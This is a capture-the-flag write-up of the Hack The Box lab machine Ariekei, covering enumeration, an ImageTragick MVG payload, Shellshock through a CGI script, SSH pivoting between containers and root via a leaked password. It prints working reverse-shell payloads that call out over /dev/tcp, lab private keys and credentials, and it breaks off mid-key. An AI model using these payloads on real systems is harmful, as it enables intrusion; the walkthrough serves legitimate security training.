
![https://labs.hackthebox.com/storage/avatars/aa26cb74eba5af265265611ab7bbd8fb.png](https://labs.hackthebox.com/storage/avatars/aa26cb74eba5af265265611ab7bbd8fb.png)

# **Machine Info :**

Ariekei is a complex machine focusing mainly on web application firewalls and pivoting techniques. This machine is by far one of the most challenging, requiring multiple escalations and container breakouts.

# **Enumeration:**

### Rustscan:

```bash
rustscan -a 10.129.95.221 -- -sC -sV -oA Ariekei
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Open 10.129.95.22:22
Open 10.129.95.221:443
Open 10.129.95.221:1022
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8xb9gsa7OjPMJVCKHsTUDL3S1LCDYS6NwQqjlKXCfQw45XDqawiXBF4ZXgsvwNo6OvWReLBjsdTXamOec0jlm+vXly6I+Un2LiJTUbi4M6ojaFyYysGDDRV5sVz9raFbpTZavvHbhxnbaWDJ9LNxduVmQdkjA4AlKVIYUr6NU/5Zi7/nVB3AG2ABmCriCQhjCgFqCHA8TNzKSoHZXUC3x120uvADDtwGTdnkjDN99NFtAeH5fMK0RqTg0qnqV/484tboGv4rocW7730exjP/iDa6tHc5bS7oo3akBVqzMs/4MdDs7AOdj8l8Sh2B9i+kYJ+Yom5TmqfFvs7P6IWqF
|   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKAkDwh2iq1PRkil+HjT7RfzknQwD1zkVWC8vp6/ZwyDk2/QjAve57JBCNy3HIAiEezZh+GPIrHB760IJXWF040=
|   256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDRTKprVX4vuO7RCFZEh9qiAqkVTk+LBgGfu9EfIv1By
443/tcp  open  ssl/http syn-ack ttl 62 nginx 1.10.2
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.10.2
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US/localityName=Dallas/organizationalUnitName=Ariekei
| Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb
| Issuer: stateOrProvinceName=Texas/countryName=US/localityName=Dallas/organizationalUnitName=Ariekei
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-09-24T01:37:05
| Not valid after:  2045-02-08T01:37:05
| MD5:   d73e:ffe4:5f97:52ca:64dc:7770:abd0:2b7f
| SHA-1: 1138:148e:dfbd:6ad8:367b:08c8:1725:7408:eedb:4a7b
| -----BEGIN CERTIFICATE-----
| MIIDUTCCAjmgAwIBAgIJANU7+Vj8InLzMA0GCSqGSIb3DQEBCwUAMEAxCzAJBgNV
| BAYTAlVTMQ4wDAYDVQQIDAVUZXhhczEPMA0GA1UEBwwGRGFsbGFzMRAwDgYDVQQL
| DAdBcmlla2VpMB4XDTE3MDkyNDAxMzcwNVoXDTQ1MDIwODAxMzcwNVowQDELMAkG
| A1UEBhMCVVMxDjAMBgNVBAgMBVRleGFzMQ8wDQYDVQQHDAZEYWxsYXMxEDAOBgNV
| BAsMB0FyaWVrZWkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDPlfP1
| SACTUskaeA5sSS1c6lzPVlgo2IRb1cxFVMF9/sVA1j91S1yrc/RS9qA79tP4PDn/
| Du7uBIE0kfMXfXtGbRKI9VClcAymnlkGnXC26GNpb9SSzdj3XXKdHj9cXP1fFs9+
| lZA9W8tPSBmgfLFDTl5Zf2MsxvkOpTuO4SASMU5mBDDkwYS4k26nHK8ANXZGLLp6
| LbdhPFnt5wlDqpHI8yoABwAwVN0XwC49VBjGe+0rpvW8w34q3712L6dIf730S/gN
| M5AqxntQFTb1Nn3LmiCPL5908JowKE1RaPqkcawizq86eEgc28UMusNVeKBrqPy4
| unIoEWzlewuvj3qHAgMBAAGjTjBMMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgXgMDIG
| A1UdEQQrMCmCEmNhbHZpbi5hcmlla2VpLmh0YoITYmVlaGl2ZS5hcmlla2VpLmh0
| YjANBgkqhkiG9w0BAQsFAAOCAQEANC9yvUk4Kp21W+LjHcRNF/44icYhKzM2afMF
| RUqRGan/v/tpUX5hx6cjAAq7hLTbGWi0xIQ4+fQCjvn8K8oVdmx9Sc5MyTiVOHoU
| 21YpcyGlA0LrKa0zIhFdsh9IUisZNGbsQ8E03/ZsY5lc7SzdKNybbH7n3riFIIAc
| a3V8LUq+B7Ry2LvNDPccUDZ2wRYWmeG45QHzLU2pCGDB1dNXGp6Ceeb7iBhkVGrM
| iw87TtcmsShGIDbS+IimieCNvu3scOb9ndoq6glXnIQI15sFfab/hrmvsU5T7fqS
| MAnozDCWv08uEEWV/sMkwDNjrXPRicAlZBX20k8rJbLRyyrRww==
|_-----END CERTIFICATE-----
|_http-title: Site Maintenance
1022/tcp open  ssh      syn-ack ttl 62 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAO5B8UZTlW7d29N2eRgSKb6yPZ4mHwEAWLYWsCyI9ZjcUgRJH/41Hx76Wym3WlpIZ3YEubwfJ8R+aavqvHlFELwqwqHrUhXsK3v6hFFfMgAdmAQkb9Bn/ryBttW+Ev0LFXWBj2qiMaOQLxvrFf2wOH+Kr0gIGU3k/lCaCEfexTc7AAAAFQCCSXpGUSu4v84yBI9kWkj6lqFGeQAAAIEA3EneIZOxmjOnrL97YRroqHuOfy/C7kQ3MXawtwlV7Letlzo8cmM7RUN8bbXSrAScFM50yfZ+4SD4+xwyNzycPKjwb70Bk9kK/E2esyPYHj79mYFBqebblC9icKK7r9y1VYQyPrQz6UvSRJkw/J1cKt98r/ljloEV1+bo3bEvXhgAAACAIy7/BpTSSztkRST6QtXFs81Tck2Oxm8MC76G9awFP83CqajwJbR5px8uzKpnuc7S3AmSMG2ITZmke8O5Aja6W36zENRz8HDR7GO+elyFumy4hE2B4JNZshiDsf7UFNW8GTTLlf6iSBPSzq19ymIV/V9fJDhRlORCZ9NWB1P2hqg=
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOfbP+R3OHBJcqmbJtV0ri1xXsuBwkObX3MiWLATv8dGoi+qlcZZmJpGO1E+mV+jYzh0pXl6xfE4wx0VSCk5xlXis1i4M3Mqb1osulpILd+nHLDB7wo2EzJf3WxEXy2A7Q0BouUD/wU3KDD2XmzE0fNIYhjdt6iTcr9kzoZeUEO4Q597cyQD7THmrG6v2ixky6FzOZySkFTDEsbfwRK3oNQ6UNMtEk2V//USU4+5S4isHnEK9YBys09scL78bLEm8hyYEQsvBFI/GdaUTFJQFZesCcSmOfp0rpbboVzh7tIlN4HHAxZAaHLu9O28LsdlvvpCB1FdAPLkt4NjB9Z4Rj
|   256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEdwabRxSWJT+/gOoHpzwH91S5A7caYQ9OHUhiPOeMxhEWxbnzlVz+Aky2NI9rEjQ+L10wihAwJFlmcLi386OdA=
|   256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKUmc79L+nKP64d6jGbkrDt5HZ7DIE9FEh6cxmkTRSih
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The target has three open ports: **22/tcp** and **1022/tcp** running SSH (OpenSSH 7.2p2 and 6.6.1p1), and **443/tcp** hosting an SSL-enabled web service (nginx 1.10.2) with domains **calvin.ariekei.htb** and **beehive.ariekei.htb**. These services provide avenues for further enumeration.

```bash
echo "10.129.95.221 beehive.ariekei.htb calvin.ariekei.htb" | sudo tee -a /etc/hosts
```

The domains **beehive.ariekei.htb** and **calvin.ariekei.htb** were mapped to the IP address **10.129.95.221** by adding the entry to the `/etc/hosts` file for proper resolution during enumeration.

## Directory Enumeration:

### calvin.ariekei.htb:

A directory brute-force scan on [**https://calvin.ariekei.htb/**](https://calvin.ariekei.htb/) using **ffuf** and the **directory-list-2.3-medium.txt** wordlist identified the **/upload** endpoint, indicating a potential resource for further exploration.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://calvin.ariekei.htb/FUZZ        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://calvin.ariekei.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

upload                  [Status: 200, Size: 1656, Words: 972, Lines: 35, Duration: 119ms]
```

![image.png](Ariekei%20-%20Hack%20The%20Box%2016d79dbf67298046b56de543833a950f/image.png)

### beehive.ariekei.htb:

```bash
dirsearch -u https://beehive.ariekei.htb/ -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/deepak/CTF_HTB/Ariekei/reports/https_beehive.ariekei.htb/__24-12-30_20-05-25.txt

Target: https://beehive.ariekei.htb/

[20:05:26] Starting: 
[20:05:44] 301 -  248B  - /blog  ->  http://beehive.ariekei.htb/blog/
[20:05:44] 200 -    2KB - /blog/

```

![image.png](Ariekei%20-%20Hack%20The%20Box%2016d79dbf67298046b56de543833a950f/image%201.png)

```bash
feroxbuster -u https://beehive.ariekei.htb/cgi-bin/ -k        
                                                                                                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://beehive.ariekei.htb/cgi-bin/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       31l       79w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       10l       30w      295c https://beehive.ariekei.htb/cgi-bin/
200      GET       35l       98w     1216c https://beehive.ariekei.htb/cgi-bin/stats
```

![image.png](Ariekei%20-%20Hack%20The%20Box%2016d79dbf67298046b56de543833a950f/image%202.png)

## **Exploitation:**

```html
<!doctype html>
    <title>Image Converter</title>
    <h1>Upload Image</h1>
    <p> This app is under development and may not work as expected  </p> 
    <form action="[](view-source:https://calvin.ariekei.htb/upload)" method=post enctype=multipart/form-data>
        <p><input type=file name=file>
        <input type=submit value=Upload></p>
    </form>
    <!--
                                     
                                g@@
            A.                 d@V@
            i@b               iA` @                    .A
            i@V@s            dA`  @                   ,@@i
            i@ '*@Ws______mW@f    @@                  ]@@@
             @]  '^********f`     @@@                g@!l@
             @b           .  ,g   @@@W             ,W@[ l@
             ]@   Mmmmmf  ~**f^   @@^@@Wm_.      _g@@`  l@
              M[    ^^      ^^    @@  ^*@@@@@@@@@@@f`   l@
              ]@i  '[]`  . '[]`   @@      ~~~~~~~`      l@
              '@W       |[        @@               _.   l@
               Y@i      'Ns    .  @@   _m@@m,    g*~VWi l@
                M@. ,.       g@` ]@@  gP    V,  '  m- ` l@
                '@W  Vmmmmmm@f   @@@. ~  m-    g   '    l@
                 '@b  'V***f    g@A@W    '     @        l@
                  '*W_         g@A`M@b       g M_.      l@
                    'VMms___gW@@f   @@.      '- ~`      W@
                       ~*****f~`     @@.     ,_m@Ws__   @@
                                     '@@.   gA~`   ~~* ]@P
                                       M@s.'`         g@A
                                        V@@Ws.    __m@@A
                                          ~*M@@@@@@@@*`   (ASCII Art credit to David Laundra) 
    -->
```

Upon inspecting the page source of calvin.ariekei.htb/uploads, the presence of an image upload form along with a comment referencing ASCII art suggests that the application could be vulnerable to **Imagetragick**—a well-known exploit targeting the ImageMagick library. This vulnerability, which allows arbitrary code execution via specially crafted images, could be exploited to gain further access or execute commands on the server.

### **Imagetragick Background:**

[ImageTragick](https://imagetragick.com/) was a 2016 bug in ImageMagick, the most common Linux command-line package for modifying and processing images.

There are several CVEs associated with the name, but the most interesting one, CVE-2016-3714, is a command injection vulnerability in how ImageMagick parses formats like MVG and SVG

The site gives an example `.mvg` file of:

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
```

### Proof-Of-Concept:

```bash
vi shell.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i &>/dev/tcp/10.10.14.43/7777 0<&1 2>&1")'
pop graphic-context
```

I’ll start `nc` listening on 7777 and upload that new payload, and a shell returns:

```bash
nc -lnvp 7777
listening on [any] 7777 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.95.221] 44394
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
[root@calvin app]#
```

### **Container 1: convert-live**

This isn’t true root however, a quick look around reveals we’re sitting in a docker container.
After gaining shell access, a hidden directory named .secrets was discovered within the /common directory. Inside .secrets, two files were found: bastion_key and bastion_key.pub. These files appear to be private and public SSH keys, potentially useful for accessing another system or service, indicating a critical finding for further exploitation.

```bash
[root@calvin /]# cd common
cd common
[root@calvin common]# ls -la
ls -la
total 20
drwxr-xr-x  5 root root 4096 Sep  2  2021 .
drwxr-xr-x 36 root root 4096 Sep  2  2021 ..
drwxrwxr-x  2 root root 4096 Sep  2  2021 .secrets
drwxr-xr-x  6 root root 4096 Sep  2  2021 containers
drwxr-xr-x  2 root root 4096 Sep  2  2021 network

```

Inside .secrets, two files were found: bastion_key and bastion_key.pub. These files appear to be private and public SSH keys, potentially useful for accessing another system or service, indicating a critical finding for further exploitation.

```bash
cd .secrets
[root@calvin .secrets]# ls -la
ls -la
total 16
drwxrwxr-x 2 root root 4096 Sep  2  2021 .
drwxr-xr-x 5 root root 4096 Sep  2  2021 ..
-r--r----- 1 root root 1679 Sep 23  2017 bastion_key
-r--r----- 1 root root  393 Sep 23  2017 bastion_key.pub
```

```bash
[root@calvin common]# cd .secrets
cd .secrets
[root@calvin .secrets]# ls -la
ls -la
total 16
drwxrwxr-x 2 root root 4096 Sep  2  2021 .
drwxr-xr-x 5 root root 4096 Sep  2  2021 ..
-r--r----- 1 root root 1679 Sep 23  2017 bastion_key
-r--r----- 1 root root  393 Sep 23  2017 bastion_key.pub
[root@calvin .secrets]# cat bastion_key
cat bastion_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR
SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH
g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv
pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI
T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y
5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG
K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU
P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947
QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK
/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet
A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0
G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl
WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c
41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY
EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS
3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ
KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1
0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP
ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI
6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG
WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t
oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf
oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
-----END RSA PRIVATE KEY-----
[root@calvin .secrets]# cat bastion_key.pub
cat bastion_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka

```

Upon further enumeration of the **/containers/blog-test** directory, a **Dockerfile** was identified containing a credential : `root:Ib3!kTEvYw6*P7s`. This password is set using the `chpasswd` command within the file. Additionally, the Dockerfile includes commands to update the system, install Python, and create a **/common** directory, potentially providing insights into the container's configuration and further exploitation opportunities.

```bash
[root@calvin containers]# cd blog-test
cd blog-test
[root@calvin blog-test]# ls -la
ls -la
total 32
drwxr-xr-x 5 root input 4096 Sep  2  2021 .
drwxr-xr-x 6 root root  4096 Sep  2  2021 ..
-rw-r--r-- 1 root input  144 Sep 23  2017 Dockerfile
-rwxr--r-- 1 root input   32 Sep 16  2017 build.sh
drwxr-xr-x 2 root root  4096 Sep  2  2021 cgi
drwxr-xr-x 7 root input 4096 Sep  2  2021 config
drwxr-xr-x 2 root root  4096 Dec 30 14:00 logs
-rwxrwx--x 1 root input  386 Nov 13  2017 start.sh
[root@calvin blog-test]# cat Dockerfile
cat Dockerfile
FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN apt-get update 
RUN apt-get install python -y
RUN mkdir /common 
```

Using the private key obtained earlier, I successfully connected to the target system via SSH with the following command:

The options `-o PubkeyAcceptedAlgorithms=+ssh-rsa` and `-o HostKeyAlgorithms=+ssh-rsa` are used to enable the deprecated `ssh-rsa` algorithm, which is disabled by default in modern SSH clients due to security concerns. These options ensure compatibility with legacy servers that still rely on `ssh-rsa`.

```bash
ssh -i id_rsa root@10.129.95.221 -p 1022 -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa

Last login: Mon Nov 13 15:20:19 2017 from 10.10.14.2
root@ezra:~# 
```

### Container 2: bastion-live:

The `waf-live` folder has a lot of files for the WAF:

nginx.conf has the site setup, including the server definitions for calvin.ariekei.htb and beehive.ariekei.htb:

What’s interesting about this network layout is that the `waf-live` is the device exposed to us on port 443, and all it’s doing is routing traffic between us and the `blog-test` container. Those images we saw when we attacked the `stats` script were generated by `waf-live` which we see when we enumerate the container files in `/common`.

Here is an excerpt from `nginx.conf` in `waf-live`, which shows that ModSecurity is acting as the WAF.

```bash
root@ezra:/common/containers/waf-live# cat nginx.conf 

user  root;
worker_processes  1;

#access_log off;
#error_log  logs/error.log  notice;
#error_log  logs/error.log  info;

#pid        logs/nginx.pid;

#access_log /dev/null;
#error_log /dev/null;

events {
    worker_connections  1024;
}

http {
    include       mime.types;
    default_type  application/octet-stream;

    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
    #                  '$status $body_bytes_sent "$http_referer" '
    #                  '"$http_user_agent" "$http_x_forwarded_for"';

    #access_log  logs/access.log  main;

    ssl on;	 
    ssl_certificate /common/containers/waf-live/ssl.crt;
    ssl_certificate_key /common/containers/waf-live/ssl.key;

    ModSecurityEnabled on;
    ModSecurityConfig modsecurity.conf;

    sendfile        on;
    #tcp_nopush     on;

    #keepalive_timeout  0;
    keepalive_timeout  65;

    ## Blog test vhost ##
    server {
        listen       443 ssl;
        server_name  beehive.ariekei.htb;

	location / {
		proxy_pass http://172.24.0.2/;
		proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
		proxy_redirect off;
		proxy_buffering off;
		proxy_force_ranges on;
		proxy_set_header        Host            $host;
		proxy_set_header        X-Real-IP       $remote_addr;
		proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		add_header X-Ariekei-WAF "beehive.ariekei.htb";

	}

        error_page 403 /403.html;
	location = /403.html {
            root   html;
        }

    }

    server {
	listen 443 ssl; 
	server_name calvin.ariekei.htb;
#	return 301 https://calvin.ariekei.htb$request_uri;	
        location / {
                proxy_pass http://172.23.0.11:8080;
                proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
                proxy_redirect off;
                proxy_buffering off;
                proxy_force_ranges on;
                proxy_set_header        Host            $host;
                proxy_set_header        X-Real-IP       $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
		add_header X-Ariekei-WAF "calvin.ariekei.htb";

        }
        
	error_page 403 /403.html;
        location = /403.html {
            root   html;
	}
	
    }
    
}
```

We also confirm that the `beehive.ariekei.htb` hostname is forwarded from the `blog-test` container.

```bash
sh -i id_rsa root@10.129.17.121 -R 4443:10.10.14.43:443 -p 1022 -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa
Last login: Tue Dec 31 05:16:26 2024 from 10.10.14.43
```

The **Shellshock** vulnerability (CVE-2014-6271) is a critical security flaw found in the **Bash shell** (Bourne Again Shell), which is widely used in Unix-based operating systems, including Linux and macOS.

The vulnerability arises from the way Bash handles specially crafted environment variables. When an environment variable containing malicious code is passed to Bash, it can be executed, allowing attackers to inject arbitrary commands. This can lead to remote code execution (RCE), which is a serious risk, especially if the vulnerable Bash instance is exposed to the internet via web servers, network services, or other mechanisms that execute system commands.

**How it works:**

1. **Bash treats environment variables** as part of the initialization process when it starts.
2. **Malicious code** can be embedded in the value of an environment variable, typically in the form of function definitions.
3. When the variable is parsed by Bash, it can execute the malicious code.

1. 1. **Bash treats environment variables** as part of the initialization process when it starts.
2. 2. **Malicious code** can be embedded in the value of an environment variable, typically in the form of function definitions.
3. 3. When the variable is parsed by Bash, it can execute the malicious code.

For example, an attacker might craft a request to a vulnerable web server with an environment variable like this:

```bash
() { :;}; /bin/bash -i >& /dev/tcp/attacker_ip/port 0>&1
```

### **Proof-of-concept:**

```bash
root@ezra:~#wget -U '() { :;}; echo; /bin/bash >& /dev/tcp/172.24.0.253/4443 0>&1' -O- http://172.24.0.2/cgi-bin/stats
--2024-12-31 05:52:35--  http://172.24.0.2/cgi-bin/stats
Connecting to 172.24.0.2:80... connected.
HTTP request sent, awaiting response...
```

```bash
nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.14.43] 47538
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash
www-data@beehive:/usr/lib/cgi-bin$
```

### Container 3: blog-test:

Almost there, but in this device we see we’re `www-data`. Luckily, we have the password from the Dockerfile, `root:Ib3!kTEvYw6*P7s`, so all we need to do is spawn a tty, so we can use su to root.

```bash
stty raw -echo ;fg
[1]  + continued  nc -lnvp 443

www-data@beehive:/usr/lib/cgi-bin$ su -
Password: 
root@beehive:~# cd /home
root@beehive:/home# ls
spanishdancer
root@beehive:/home# cd spanishdancer/
root@beehive:/home/spanishdancer# ls
content  user.txt
root@beehive:/home/spanishdancer# cat user.txt 
41af9****************************
```

Luckily it appears there’s a couple of ssh keys in there.

```bash
root@beehive:/home/spanishdancer# ls -la
total 32
drwxr-xr-x 5 1000 1000 4096 Sep  2  2021 .
drwxr-xr-x 3 root root 4096 Sep  2  2021 ..
-rw-r--r-- 1 1000 1000 3791 Sep 24  2017 .bashrc
drwx------ 2 1000 1000 4096 Sep  2  2021 .cache
-rw-r--r-- 1 1000 1000  655 Sep 16  2017 .profile
drwx------ 2 1000 1000 4096 Sep  2  2021 .ssh
drwxrwxr-x 3 1000 root 4096 Sep  2  2021 content
-r--r----- 1 1000 root   33 Dec 31 04:52 user.txt
root@beehive:/home/spanishdancer# cd .ssh
root@beehive:/home/spanishdancer/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@beehive:/home/spanishdancer/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C3EBD8120354A75E12588B11180E96D5

2UIvlsa0jCjxKXmQ4vVX6Ez0ak+6r5VuZFFoalVXvbZSLomIya4vYETv1Oq8EPeh
KHjq5wFdlYdOXqyJus7vFtB9nbCUrgH/a3og0/6e8TA46FuP1/sFMV67cdTlXfYI
Y4sGV/PS/uLm6/tcEpmGiVdcUJHpMECZvnx9aSa/kvuO5pNfdFvnQ4RVA8q/w6vN
p3pDI9CzdnkYmH5/+/QYFsvMk4t1HB5AKO5mRrc1x+QZBhtUDNVAaCu2mnZaSUhE
abZo0oMZHG8sETBJeQRnogPyAjwmAVFy5cDTLgag9HlFhb7MLgq0dgN+ytid9YA8
pqTtx8M98RDhVKqcVG3kzRFc/lJBFKa7YabTBaDoWryR0+6x+ywpaBGsUXEoz6hU
UvLWH134w8PGuR/Rja64s0ZojGYsnHIl05PIntvl9hinDNc0Y9QOmKde91NZFpcj
pDlNoISCc3ONnL4c7xgS5D2oOx+3l2MpxB+B9ua/UNJwccDdJUyoJEnRt59dH1g3
cXvb/zTEklwG/ZLed3hWUw/f71D9DZV+cnSlb9EBWHXvSJwqT1ycsvJRZTSRZeOF
Bh9auWqAHk2SZ61kcXOp+W91O2Wlni2MCeYjLuw6rLUHUcEnUq0zD9x6mRNLpzp3
IC8VFmW03ERheVM6Ilnr8HOcOQnPHgYM5iTM79X70kCWoibACDuEHz/nf6tuLGbv
